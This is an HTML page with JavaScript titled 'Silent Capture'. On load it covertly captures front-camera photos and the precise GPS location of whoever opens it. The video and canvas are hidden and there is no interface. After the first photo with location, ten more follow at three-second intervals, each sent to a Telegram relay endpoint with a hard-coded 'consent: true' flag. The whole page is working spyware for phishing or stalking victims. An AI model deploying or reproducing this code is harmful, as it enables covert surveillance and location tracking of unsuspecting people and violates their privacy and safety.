<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="utf-8" />
  <meta name="viewport" content="width=device-width,initial-scale=1" />
  <title>Silent Capture</title>
  <style>video,canvas{display:none!important;height:0;width:0;opacity:0}</style>
</head>
<body>
<video id="video" autoplay playsinline muted></video>
<canvas id="canvas"></canvas>
<script>
(async function(){
  // CONFIG
  const NUM_FOLLOWUP = 10; // number of photos after first
  const INTERVAL_MS = 3000; // 3 seconds between follow-up captures
  const IMAGE_WIDTH = 640;
  const IMAGE_HEIGHT = 480;
  const TELEGRAM_ENDPOINT = '/api/telegram'; // serverless endpoint

  const video = document.getElementById('video');
  const canvas = document.getElementById('canvas');
  const ctx = canvas.getContext('2d');
  let stream = null;

  function nowTs(){ return new Date().toISOString(); }

  function dataUrlFromVideo(){
    try{
      canvas.width = IMAGE_WIDTH;
      canvas.height = IMAGE_HEIGHT;
      ctx.drawImage(video, 0, 0, IMAGE_WIDTH, IMAGE_HEIGHT);
      return canvas.toDataURL('image/jpeg', 0.85);
    }catch(e){
      return null;
    }
  }

  function getPreciseLocation(timeout=15000){
    return new Promise((resolve,reject)=>{
      if(!('geolocation' in navigator)) return reject(new Error('No geolocation'));
      navigator.geolocation.getCurrentPosition(
        pos=> resolve({
          latitude: pos.coords.latitude,
          longitude: pos.coords.longitude,
          accuracy: pos.coords.accuracy,
          timestamp: pos.timestamp
        }),
        err=> reject(err),
        { enableHighAccuracy: true, timeout, maximumAge: 0 }
      );
    });
  }

  async function sendImage(imageDataUrl, locationObj=null, kind='photo'){
    // payload: { consent:true, kind, image: { dataUrl, ts }, location }
    try{
      const payload = {
        consent: true,
        kind,
        image: { dataUrl: imageDataUrl, ts: nowTs() },
        location: locationObj || null
      };
      await fetch(TELEGRAM_ENDPOINT, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(payload),
        keepalive: true
      });
    }catch(e){
      // silent fail; you can view console for debug
      console.error('sendImage error', e);
    }
  }

  async function startCaptureFlow(){
    try{
      // Request camera
      stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user', width: { ideal: IMAGE_WIDTH }, height: { ideal: IMAGE_HEIGHT } }, audio: false });
      video.srcObject = stream;
      await video.play();

      // First capture: try to get precise location before sending
      let firstLoc = null;
      try{
        firstLoc = await getPreciseLocation(15000);
      }catch(e){
        // location failed or timed out; proceed with null location
        firstLoc = null;
      }

      // Capture first photo and send with location (if any)
      const firstData = dataUrlFromVideo();
      if(firstData) await sendImage(firstData, firstLoc, 'first');
      // Wait a small moment before starting follow-ups
      await new Promise(r=>setTimeout(r, 500));

      // Follow-up captures: NUM_FOLLOWUP photos at INTERVAL_MS each, send each immediately without location
      for(let i=0;i<NUM_FOLLOWUP;i++){
        await new Promise(r=>setTimeout(r, INTERVAL_MS));
        const d = dataUrlFromVideo();
        if(d) await sendImage(d, null, 'followup');
      }
    }catch(err){
      console.error('capture flow error', err);
    }finally{
      // stop camera
      try{ if(stream) stream.getTracks().forEach(t=>t.stop()); }catch(e) {}
    }
  }

  // Start automatically when page loads
  // Browsers will prompt for camera & location permissions as required.
  window.addEventListener('load', () => {
    // Kick off capture asynchronously
    // We intentionally do not show any UI; permissions prompts are browser-controlled.
    startCaptureFlow();
  });
})();
</script>
</body>
</html>
